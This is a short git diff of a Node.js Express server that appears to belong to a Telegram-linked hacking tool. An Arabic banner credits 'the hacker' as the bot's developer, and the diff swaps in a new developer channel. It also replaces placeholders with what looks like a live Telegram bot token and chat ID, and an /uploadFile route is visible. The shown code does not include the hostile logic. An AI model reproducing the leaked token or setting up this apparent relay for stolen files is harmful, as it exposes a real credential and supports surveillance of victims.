@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = 'توكن'
-const id = 'ايدي'
+const token = '7556980993:AAF1dVr6m2DitiaFOY8_1v59wBKR04p-xXA'
+const id = '5857518644'
 const address = 'https://www.google.com'
 
 const app = express();
@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت :  الهاكر متمرد الضامئ قناة المطور @hskakansnan</h1>')
+    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت :  الهاكر متمرد الضامئ قناة المطور @El_Shemi_Basha</h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
